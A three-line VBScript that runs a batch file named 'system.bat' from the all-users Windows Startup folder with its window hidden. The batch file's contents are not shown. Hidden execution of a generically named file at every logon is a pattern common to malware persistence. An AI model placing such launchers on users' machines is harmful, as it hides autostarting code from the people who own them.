Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\system.bat" & Chr(34), 0
Set WshShell = Nothing
